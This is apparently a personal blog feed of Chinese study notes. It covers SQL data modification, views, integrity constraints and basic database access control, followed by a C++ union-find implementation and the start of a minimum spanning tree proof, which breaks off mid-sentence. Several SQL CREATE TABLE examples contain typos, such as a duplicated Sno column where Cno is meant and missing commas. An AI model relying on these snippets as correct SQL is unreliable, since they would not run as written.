class="markdownIt-Anchor" href="#二修改数据-update">#</a> 二，修改数据 (UPDATE)</h5><p><strong>语法：格式如下，其功能是修改指定表中满足 <code>WHERE</code>  子句条件的元组</strong></p><ul><li>如果省略 WHERE 子句，则表示要修改表中所有元组<br><img src="https://img-blog.csdnimg.cn/ae9586d56ff742f4b98bbcdef7722ac6.png" alt="修改数据"><br>例子：将学生 201215121 的年龄改为 22 岁</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">UPDATE student</span><br><span class="line">set Sage=22</span><br><span class="line">WHERE Sno=&#x27;201215121&#x27;;</span><br></pre></td></tr></table></figure><p>修改多个元组的值：将所有学生的年龄增加一岁</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">UPDATE student</span><br><span class="line">set Sage=Sage+1;</span><br></pre></td></tr></table></figure><h5 id="三删除数据-delete"><a class="markdownIt-Anchor" href="#三删除数据-delete">#</a> 三，删除数据 (DELETE)</h5><p><strong>语法：格式如下，其功能是从指定表中删除满足 <code>WHERE</code>  子句条件的所有元组，注意</strong></p><ul><li><code>DELETE</code>  删除的是表的数据，而不是表的定义</li><li>如果省略 <code>WHERE</code>  子句，那么就表示删除全部元组<br><img src="https://img-blog.csdnimg.cn/e45c2afc96444072be578fdaa0d0cb17.png" alt="删除数据"><br><strong>注意事项：在进行数据库数据的更新时，需要保证数据库的一致性，以及约束条件</strong></li></ul><h3 id="视图"><a class="markdownIt-Anchor" href="#视图">#</a> 视图</h3><h5 id="一关于视图"><a class="markdownIt-Anchor" href="#一关于视图">#</a> 一，关于视图</h5><p>【定义】视图是一个<strong>虚表</strong>，其本质就是一条 <code>SELECT</code>  语句，而查询结果被赋予了一个名字，也即视图名字。或者说视图本身不包含任何数据，它只包含映射到基表的一个查询语句，当基表数据发生变化时，视图数据也随之变化。其目的就是在于方便，简化数据操作。<br><strong>视图的作用：</strong></p><ul><li>视图能够简化用户的操作</li><li>视图使用户能以多种角度看待同一数据</li><li>视图对重构数据库提供了一定程度的逻辑独立性</li><li>视图能够对机密数据提供安全保护</li><li>适当的利用视图可以更清晰的表达查询</li></ul><h5 id="二视图的定义和删除"><a class="markdownIt-Anchor" href="#二视图的定义和删除">#</a> 二：视图的定义和删除</h5><p><strong>1, 视图的定义</strong><br><strong>语法：使用 <code>CREATE VIEW</code>  语句创建视图，格式如下</strong><br><img src="https://img-blog.csdnimg.cn/35453393eb694f159939b678b6dd963f.png" alt="建立视图"></p><ul><li>子查询可以是<strong>任意的 <code>SELECT</code>  语句</strong>（是可以含有 <code>ORDER BY</code>  子句和 <code>DISTINCT</code>  短语取决于具体系统）</li><li>组成视图的属性列名<strong>要么全部省略要么全部指定，不能有第三种情况</strong></li><li>如果省略视图列名，则其列名默认由 <strong> <code>SELECT</code>  子句目标列诸字段组成</strong><br>例子：建立信息系 IS 学生的视图</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CREATE VIEW IS_student</span><br><span class="line">AS </span><br><span class="line">SELECT Sno,Sname,Sage,Sdept</span><br><span class="line">FROM student</span><br><span class="line">WHERE Sdept=&#x27;IS&#x27;</span><br></pre></td></tr></table></figure><p>视图也可以基于多个表，同一，视图可以基于视图创建，也可以带有表达式。<br>例子：定义一个反映学生出生年份的视图</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CREATE VIEW birthday(Sno,Sname,Syear)</span><br><span class="line">AS</span><br><span class="line">SELECT Sno,Sname,2022-Sage</span><br><span class="line">FROM student;</span><br></pre></td></tr></table></figure><p><strong>注意：在定义视图时如果有  <code>WITH CHECK OPTION</code>  子句，则在对视图进行 UPDATE,INSERT,DELETE 时要保证更新，插入，删除的行满足视图定义的谓词条件。</strong><br><strong>2，视图的删除</strong></p><ul><li>基本表删除之后，由该基本表导出的所有视图均无法使用，<strong>但是视图的定义没有从字典中清除</strong></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DROP VIEW &lt;视图名&gt; [CASCADE];</span><br></pre></td></tr></table></figure><h5 id="三视图的查询"><a class="markdownIt-Anchor" href="#三视图的查询">#</a> 三，视图的查询</h5><p><strong>语法：从用户角度出发，查询视图和查询基本表相同；从 DBMS 角度出发，采用视图消解法，具体来讲</strong></p><ul><li>首先进行<strong>有效性检查</strong></li><li>接着转换成<strong>等价的</strong>对基本表的查询</li><li>最后执行<strong>修正</strong>后的查询</li></ul><h5 id="四视图的更新"><a class="markdownIt-Anchor" href="#四视图的更新">#</a> 四，视图的更新</h5><p><strong>语法：视图是虚表，所以对视图的更新最终会转化为对基本表的更新。为了防止用户通过视图对数据进行更新时，有意或无意地对不属于视图范围内的基本表数据进行操作，可以在定义视图时加上 <code>WITH CHECK OPTION</code>  子句。这样在更新时，如果不满足条件，DBMS 会拒绝操作</strong><br><strong>（1）UPDATE</strong><br> 例如：如果在定义视图 <code>is_student</code>  在定义时加入了 <code>WITH CHECK OPTION</code>  子句，接着再执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">UPDATE is_student</span><br><span class="line">SET Sdept=&#x27;MA&#x27;</span><br><span class="line">WHERE Sno=&#x27;201215125&#x27;;</span><br></pre></td></tr></table></figure><p>那么在更新时如果将 <code>Sdept</code>  字段改为了’MA’或其他值，DBMS 就会拒绝执行。<br><strong>（2）INSERT</strong><br> 向信息系学生视图 <code>IS_Student</code>  中插入一个新的学生记录：201215129，赵新，20 岁</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO is_student</span><br><span class="line">VALUES(&#x27;201215129&#x27;,&#x27;赵新&#x27;,20);</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/3df7025dcf304f8d85098a071791c41e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5b-r5LmQ5rGf5rmW,size_20,color_FFFFFF,t_70,g_se,x_16" alt="插入操作"></p><ul><li>这里视图没有数据，且 20 插入到了错误的地方（如果没有 <code>WITH CHECK OPTION</code>  就会导致这些错误出现）</li><li>如果假如了 <code>WITH CHECK OPTION</code> ，那么 DBMS 会拒绝执行<br><strong>（3）DELETE</strong><br> 删除数据时，有没有 <code>WITH CHECK OPTION</code>  是一样的。</li></ul><h1 id="四数据库完整性"><a class="markdownIt-Anchor" href="#四数据库完整性">#</a> 四，数据库完整性</h1><p>【定义】数据库完整性是指数据的正确性和相容性。</p><ul><li><strong>正确性</strong>：数据是符合现实世界语义、反映当前实际状况的。例如性别只能是男或女</li><li><strong>相容性</strong>：是指数据库同一对象在不同关系表中的数据是符合逻辑的。比如说年龄一般都在 1-100 岁，当然也有超过一百岁的，反正没有两百岁，三百岁成仙的人类<br><strong>数据库完整性和安全性的区别：</strong></li><li><strong>完整性</strong>：是为了防止数据库中存在<strong>不符合语义的数据</strong>，也就是防止数据库中存在<strong>不正确的数据</strong>。因此，完整性检查和控制的防范对象是<strong>不合语义的、不正确的数据，防止它们进入数据库</strong></li><li><strong>安全性</strong>：是保护数据库<strong>防止恶意破坏和非法存取</strong>。因此，安全性控制的防范对象是<strong>非法用户和非法操作，防止他们对数据库数据的非法存取</strong><br> ** 为维护完整性 DBMS 必须要实现的功能</li><li>提供定义完整性约束条件的机制</li><li>提供完整性检查的方法</li><li>进行违约处理</li></ul><h3 id="数据库三大完整性"><a class="markdownIt-Anchor" href="#数据库三大完整性">#</a> 数据库三大完整性</h3><h4 id="一实体完整性"><a class="markdownIt-Anchor" href="#一实体完整性">#</a> 一，实体完整性</h4><p>若属性 A 时基本关系 R 的<strong>主属性</strong>，则属性 A<strong> 不能取空值</strong><br><strong>（1）定义实体完整性</strong><br>定义方法：关系模型的实体完整性在 <code>CREATE TABLE</code>  中用 <code>PRIMARY KEY</code>  定义。注意：</p><ul><li><strong>如果主码仅有一个属性（单属性）</strong>：可以定义为<strong>列级约束条件</strong>也可以定义为<strong>表级约束条件</strong></li><li><strong>如果主码有多个属性</strong>：注意<strong>仅能定义为表级约束条件</strong><br><strong>（2）实体完整性的检查和违约处理</strong></li><li><strong>检查主码值是否唯一，如果不唯一则拒绝插入或修改</strong></li><li><strong>检查主码的各个属性是否为空，只要有一个为空就拒绝插入或修改</strong><br><strong>其中检查记录中主码值是否唯一有两种方法：</strong></li><li>全表扫描：十分耗时</li><li>建立索引：关系数据库管理系统一般都会在主码上自动建立一个索引</li></ul><h4 id="二参照完整性"><a class="markdownIt-Anchor" href="#二参照完整性">#</a> 二，参照完整性</h4><p><strong>（1）定义参照完整性</strong><br><strong>定义方法：关系模型的参照完整性在 <code>CREATE TABLE</code>  中用 <code>FOREIGN KEY</code>  定义，同时用 <code>REFERENCES</code>  短语指明这些外码参照哪些表的主码</strong><br>定义 <code>sc</code>  表的时候，其 <code>(Sno,Cno)</code>  是主码，分别参照 <code>Sudent</code>  的主码和 <code>Course</code>  表的主码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE SC</span><br><span class="line">(</span><br><span class="line">Sno CHAR(9) NOT NULL,</span><br><span class="line">Sno CHAR(4) NOT NULL,</span><br><span class="line">Grade SMALLINT,</span><br><span class="line"></span><br><span class="line">PRIMARY KEY(Sno,Cno),</span><br><span class="line">FOREIGN KEY(Sno) REFERENCES Student(Sno),</span><br><span class="line">FOREIGN KEY(Cno) REFERENCES Course(Cno)</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p><strong>（2）参照完整性检查和违约处理</strong><br><strong> A：破坏完整性的行为</strong><br>参照完整性将表与表联系在了一起，所以对其中一个表的修改很可能会影响到另外一张表。举个例子，被参照表是 <code>Student</code> ，参照表是 <code>sc</code> ，破坏参照完整性的行为及其违约处理如下表所示：<br><img src="https://img-blog.csdnimg.cn/e4864b3c42ec4a80bda80abd90f6e55e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5b-r5LmQ5rGf5rmW,size_20,color_FFFFFF,t_70,g_se,x_16" alt="参照完整性"><br><strong>对于参照表 <code>sc</code>  的行为：</strong></p><ul><li><strong>向 <code>sc</code>  表（参照表）中插入一个元组，这是会被拒绝的</strong>。因为有可能你所插入的元组的 <code>Sno</code> （外码）无法在 <code>Student</code>  表中找到，这就意味着在成绩表中插入了一个非本班同学的成绩，这显然是不合理的</li><li><strong>修改 <code>sc</code>  表（参照表）中的一个元组，这是会被拒绝的</strong>。因为有可能你会修改该元组的 <code>Sno</code> （外码），这就可能导致 <code>Sno</code>  无法在 <code>Student</code>  表中找到。</li><li><strong>删除 <code>sc</code>  表（参照表）中的一个元组，这是可行的</strong>。因为它无非就是一条成绩信息。<br><strong>对于被参照 <code>Student</code>  的行为：</strong></li><li><strong>删除 <code>Student</code>  表（被参照表）中的一个元组，这是会被拒绝（也有可能级联删除或设为 <code>NULL</code> ）的</strong>。因为删除一个元组后，该元组所对应的 <code>Sno</code> （主码）将不复存在，这就有可能导致 <code>sc</code>  表（参照表）中某些元组的 <code>Sno</code> （外码）在 <code>Student</code>  表中找不到。当然可以级联删除将 SC 表的相关内容一起删除。</li><li><strong>修改 <code>Student</code>  表（被参照表）中的一个元组，这是会被拒绝（也有可能级联删除或设为 <code>NULL</code> ）的</strong> 。因为一旦修改了该元组的 <code>Sno</code>  属性，就会发生和上面一样的问题。可以进行级联修改，这回导致 SC 表中的数据也被修改</li><li><strong>向 <code>Student</code>  表（被参照表）插入一个元组，这是可行的</strong>。因为它无非就是一个新同学嘛<br><strong> B，违约处理措施</strong><br>①拒绝：不允许操作，为默认策略<br>②级联：上述提到了。级联删除或修改会影响到其他与他相关的表的数据。<br>③设为空值：当删除或修改 <code>专业</code> 表（被参照表）的一个元组时造成了不一致，则<strong>将 <code>学生</code> 表（参照表）中的所有造成不一致的元组的对应属性（专业号）设为空值</strong></li><li>比如删除 <code>专业</code> 表中专业号为 12 的专业，那么接着就要把 <code>学生</code> 表中专业号 = 12 的所有元组的专业号设置为空值<br><strong> C：SQL 实现</strong></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE SC</span><br><span class="line">(</span><br><span class="line">Sno CHAR(9)</span><br><span class="line">Sno CHAR(4) </span><br><span class="line">Grade SMALLINT,//是外码也是主码，故不能取空值，实体完整性</span><br><span class="line">PRIMARY KEY(Sno,Cno),</span><br><span class="line">FOREIGN KEY(Sno) REFERENCES Student(Sno)</span><br><span class="line">ON DELETE CASCADE //删除Student表的元组时，级联删除本表相应元组</span><br><span class="line">ON UPDATE CASCADE, //更新Student表中的Sno时，级联更新本表相应元组</span><br><span class="line">FOREIGN KEY(Cno) REFERENCES Course(Cno)</span><br><span class="line">ON DELETE NO ACTION //删除Course表的元组造成不一致时，拒绝执行</span><br><span class="line">ON UPDATE CASCADE //更新Course表中的Cno时，级联更新本表相应元组</span><br><span class="line">);</span><br></pre></td></tr></table></figure><h4 id="三用户自定义完整性"><a class="markdownIt-Anchor" href="#三用户自定义完整性">#</a> 三，用户自定义完整性</h4><p>用户自定义完整性针对某一具体关系数据库的约束条件，反映<strong>某一具体应用所涉及的数据必须满足的语义要求</strong><br><strong>（1）属性上的约束条件</strong><br><strong> A: 不允许取空值 (NOT NULL)</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE SC</span><br><span class="line">(</span><br><span class="line">Sno CHAR(9),</span><br><span class="line">Cno CHAR(4),</span><br><span class="line">Grade SMALLINT NOT NULL,</span><br><span class="line">PRIMARY KEY(Sno,Cno)//定义了实体完整性，隐含了不允许取空值，在列级中可不写</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p><strong>B：列值唯一（UNIQUE）</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE DEPT</span><br><span class="line">(</span><br><span class="line">Deptno NUMERIC(2),</span><br><span class="line">Dname CHAR(9) UNIQUE NOT NULL, //唯一且不能取空值</span><br><span class="line">Location CHAR(10),</span><br><span class="line">PRIMARY KEY(Depto)</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p><strong>C：满足指定条件（CHECK）</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE Student</span><br><span class="line">(</span><br><span class="line">Sno CHAR(9) PRIMARY KEY,</span><br><span class="line">Sname CHAR(8) NOT NULL,</span><br><span class="line">Ssex CHAR(2) CHECK(Ssex IN (&#x27;男&#x27;,&#x27;女&#x27;)),</span><br><span class="line">Sage SMALLINT,</span><br><span class="line">Sdept CHAR(20)</span><br><span class="line">);</span><br><span class="line">-------------------------------------------</span><br><span class="line">CREATE TABLE SC</span><br><span class="line">(</span><br><span class="line">Sno CHAR(9),</span><br><span class="line">Cno CHAR(4),</span><br><span class="line">Grade SMALLINT CHECK(Grade &gt;= 0 AND Grade &lt;= 100),</span><br><span class="line"></span><br><span class="line">PRIMARY KEY(Sno,Cno),</span><br><span class="line">FOREIGN KEY(Sno) REFERENCES Student(Sno),</span><br><span class="line">FOREIGN KEY(Cno) REFERENCES Course(Cno)</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p><strong>（2）元组上的约束条件</strong><br>同属性值限制相比，元组级的限制可以设置<strong>不同属性之间</strong>的取值的相互约束条件<br>如，规定插入男性时，其名字不能以 <code>Ms.</code>  开头</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE Student</span><br><span class="line">(</span><br><span class="line">Sno Char(9),</span><br><span class="line">Sname CHAR(8) NOT NULL,</span><br><span class="line">Ssex CHAR(2),</span><br><span class="line">Sage SMALLINT,</span><br><span class="line">Sdept CHAR(20),</span><br><span class="line">PRIMARY KEY(Sno),</span><br><span class="line"></span><br><span class="line">CHECK(Ssex=&#x27;女&#x27; OR Sname NOT LIKE &#x27;Ms.%&#x27;)</span><br><span class="line"></span><br><span class="line">);</span><br></pre></td></tr></table></figure><h3 id="约束命名子句断言和触发器"><a class="markdownIt-Anchor" href="#约束命名子句断言和触发器">#</a> 约束命名子句，断言和触发器</h3><p><s>这里老师的 PPT 似乎没有讲，先放一放，先找讲过的复习</s> ：）</p><h1 id="五数据库安全性"><a class="markdownIt-Anchor" href="#五数据库安全性">#</a> 五，数据库安全性</h1><p>【定义】保护数据库以防止不合法使用所造成的数据泄露，更改或者破坏</p><h3 id="数据库安全性概述"><a class="markdownIt-Anchor" href="#数据库安全性概述">#</a> 数据库安全性概述</h3><h4 id="一数据库的不安全因素"><a class="markdownIt-Anchor" href="#一数据库的不安全因素">#</a> 一，数据库的不安全因素</h4><p><strong>1. 非授权用户对数据库的恶意存取和破坏:<strong> 一些</strong>黑客</strong>和<strong>犯罪分子</strong>在用户存取数据库时猎取用户名和用户口令，然后<strong>假冒</strong>合法用户偷取、修改甚至破坏用户数据。防范措施有:</p><ul><li><strong>用户身份鉴别</strong></li><li><strong>存取控制</strong></li><li><strong>视图</strong><br><strong> 2. 数据库中重要或敏感的数据被泄露:</strong> <strong>黑客和敌对分子</strong>千方百计盗窃数据库中的重要数据，一 - 些机密信息被暴露。防范措施有</li><li><strong>强制存取控制</strong></li><li><strong>数据加密存储</strong></li><li><strong>加密传输</strong><br><strong> 3. 安全环境的脆弱性</strong></li></ul><h4 id="二数据库安全性控制"><a class="markdownIt-Anchor" href="#二数据库安全性控制">#</a> 二：数据库安全性控制</h4><p><strong>数据库安全性控制的常用方法：</strong></p><ul><li>用户标识和鉴定（Identification &amp; Authentication）: 系统提供的最外层安全保护措施</li><li>存取控制：访问权限</li><li>通过视图调整授权 ：定义可向用户授权数据库特定部分的用户视图</li><li>审计：追踪信息，重现导致数据库现有状况的一系列事件</li><li>密码存储：使用加密技术保护机密数据</li></ul><h5 id="1用户身份鉴别"><a class="markdownIt-Anchor" href="#1用户身份鉴别">#</a> 1，用户身份鉴别</h5><p><strong>每个用户在系统中都有一个用户标识。每个用户标识由用户名（user name）和用户标识号（UID）组成。系统内部记录着所有合法用户的标识，每次用户进入系统时，系统会核对用户的身份，只有通过鉴定后才提供相关数据库管理系统的权限</strong><br><strong>（1）静态口令鉴别</strong><br><strong>（2）动态口令鉴别</strong><br><strong>（3）生物特征鉴别</strong><br><strong>（4）智能卡鉴别</strong></p><h5 id="2存取控制"><a class="markdownIt-Anchor" href="#2存取控制">#</a> 2，存取控制</h5><p><strong>存取控制的目的就是确保只授权给有资格的用户访问数据库的权限，其余人等无法接近数据。主要包括以下两个部分</strong></p><ul><li><strong>定义用户权限</strong>：用户对某一数据对象的操作权力称为<strong>权限</strong>。某个用户应该具有何种权限是个<strong>管理问题和政策问题</strong>，而不是技术问题。数据库管理系统的功能是<strong>保证这些决定的执行</strong>。为此，数据库管理系统必须提供适当的语言来<strong>定义用户权限</strong>，这些定义经过编译后存储在数据字典中，被称做<strong>安全规则或授权规则</strong></li><li><strong>合法权限检查</strong>：每当用户发出存取数据库的操作请求后 (请求一般应包括操作类型、操作对象和操作用户等信息)，数据库管理系统查找<a href="#lable">数据字典</a>，<strong>根据安全规则进行合法权限检查</strong>，若用户的操作请求超出了定义的权限，系统将<strong>拒绝执行此操作</strong><br><strong>而存取控制方法又分为以下两类：</strong></li></ul><h6 id="1自主存取控制dac"><a class="markdownIt-Anchor" href="#1自主存取控制dac">#</a> （1）自主存取控制 DAC</h6><p><strong>A，基本概念</strong><br><strong>自主存取控制 DAC：SQL 中自主存取控制主要是通过 <code>GRANT</code>  语句和 <code>REVOKE</code>  语句来实现的。是指用户可以 “自主” 地决定将数据的存取权限授予何人、决定是否也将 “授权” 的权限授予别人。</strong><br><strong>授权：用户权限由数据库对象和操作类型这两个要素组成。定义一个用户的存取权限就是定义这个用户可以在哪些数据对象上进行哪些类型的操作。所谓授权就是指定义存取权限</strong></p><ul><li>在<strong>非关系系统</strong>中，用户只能对<strong>数据</strong>进行操作，存取控制的数据库对象也仅限于数据本身</li><li>在<strong>关系数据库系统</strong>中，存取控制的对象不仅有数据本身 (基本表中的数据、属性列上的数据），还有<strong>数据库模式 (包括数据库、基本表、视图和索引的创建等)</strong><br> 下表就是<strong>关系数据库中的主要存取权限：</strong><br><img src="https://img-blog.csdnimg.cn/202afc8ee1314578ac465140b086d3af.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5b-r5LmQ5rGf5rmW,size_20,color_FFFFFF,t_70,g_se,x_16" alt="主要存取权限"></li></ul>]]></content>
      
      
      <categories>
          
          <category> 课程笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>算法学习</title>
      <link href="/2023/11/15/%E5%9F%BA%E7%A1%80%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0/"/>
      <url>/2023/11/15/%E5%9F%BA%E7%A1%80%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>这里更新主要更新一些 模板 / 数据结构 /… 的题目吧</p><h3 id="并查集"><a class="markdownIt-Anchor" href="#并查集">#</a> 并查集</h3><p>【定义】：用来管理元素分组情况的数据结构。并查集可以高效的进行如下操作：</p><ul><li>查询元素 a 和元素 b 是否属于同一组</li><li>合并元素 a 和 b 所在的组<br><strong>需要注意并查集只能进行合并操作，但是无法进行分割操作</strong><br>【结构】：并查集是利用树形结构实现的。不过不是二叉树。<br>（1）初始化：<br>首先准备 n 个节点代表 n 个元素。最开始没有边。<br><img src="https://github.com/dagzi1231/imagestorage/blob/img/img/screenshot(1).png?raw=true" alt="初始化"><br>（2）合并：<br>如图，从一个组的根向另一个组的根连边，这样两棵树变成一颗树，也就把两个组合合并为一个组。<br><img src="https://github.com/dagzi1231/imagestorage/blob/img/img/screenshot(2).png?raw=true" alt="合并"><br>（3）查询：<br>为了查询两个节点是否属于同一组，需要沿着树向上走，来查询包含这个元素的根是谁。两个节点走到同一个根，则说明他们属于同一组。下图 5，2 走到 1，7 走到 6，所以 7 和 2，5 不是同一组。<br><img src="https://github.com/dagzi1231/imagestorage/blob/img/img/screenshot.png?raw=true" alt="查询"><br><strong>并查集实现中注意的点：</strong><br>避免退化！</li><li>对于每颗树，记录这棵树的高度（rank）</li><li>合并时如果两棵树的 rank 不同，则 rank 小的向 rank 大的连边。<br>此外，通过路径压缩，可以使并查集更高效。对每个节点，一旦走到了一次根节点，就把这个点到父亲的边改为直连连向根。如图<br><img src="https://github.com/dagzi1231/imagestorage/blob/img/img/screensho1.png?raw=true" alt="路径压缩"></li></ul><p><strong>这里给出并查集的实现</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> par[MAX_N]; <span class="comment">//父亲</span></span><br><span class="line"><span class="type">int</span> rank[MAX_N]; <span class="comment">//树的高度</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化n个元素</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init</span><span class="params">(<span class="type">int</span> n)</span></span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">par[i] = i;</span><br><span class="line">rank[i] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//查询树的根</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">find</span><span class="params">(<span class="type">int</span> x)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(par[x] == x)&#123;</span><br><span class="line"><span class="keyword">return</span> x;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">return</span> par[x] = <span class="built_in">find</span>(par[x]); <span class="comment">//路径压缩</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 合并x和y所属的集合</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">unite</span><span class="params">(<span class="type">int</span> x,<span class="type">int</span> y)</span></span>&#123;</span><br><span class="line">x = <span class="built_in">find</span>(x);</span><br><span class="line">y = <span class="built_in">find</span>(y);</span><br><span class="line"><span class="keyword">if</span>(x == y) <span class="keyword">return</span>;</span><br><span class="line"><span class="keyword">if</span>(rank[x] &lt; rank[y])&#123;</span><br><span class="line">par[x] = y;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">par[y] = x;</span><br><span class="line"><span class="keyword">if</span> (rank[x] == rank[y]) rank[x]++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 判断 x 和 y 是否属于同一个集合</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">same</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">find</span>(x) == <span class="built_in">find</span>(y);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="最小生成树"><a class="markdownIt-Anchor" href="#最小生成树">#</a> 最小生成树</h2><p>再来复习一下最小生成树吧   ：）<br>【生成树定义】给定一个无向图，如果它的某一个子图中任意两个顶点都相互连通并且是一棵树，那莪这棵树就叫做生成树。如果边上有权值，那么使得边权和最小的生成树是最小生成树。<br>【应用例题】：<br><img src="https://github.com/dagzi1231/imagestorage/blob/img/img/screenshot(3).png?raw=true" alt="例题示例"></p><h4 id="算法1prim算法"><a class="markdownIt-Anchor" href="#算法1prim算法">#</a> 算法 1（Prim 算法）</h4><p>首先，我们假设有一颗只包含一个点 v 的树 T。然后贪心选取 T 和其他顶点之间相连的最小权值的边，并把它加到 T 中。不断进行这个操作，即可获得一个生成树。下面来证明：<br>我们令 V 表示顶的集合。假设现在已经求得的生成树的顶点的集合是 X（<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⊂</mo></mrow><annotation encoding="application/x-tex">\subset</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mrel">⊂</span></span></span></span> V）, 并且存在在 V 上的最小生成树使得 T 是它的一个子图。下面我们证明存在一棵最小生成树使得 T 是它的一个子图并且它包含了连接 X 和 V\X 的权值最小的边。记连接 X 和 V\X 的权值最小的边为 e，它连接着 V（∈X）和 u (∈V \ X)。 根据假设，存在一颗 V 上的最小生成树使得 T 是它的一个子图。如果 e 也在这棵最小生成树上，问题就得到证明了，所以我们假设 e 不再这棵书上。因为生成树的本质是一棵树，所以在添加了 e 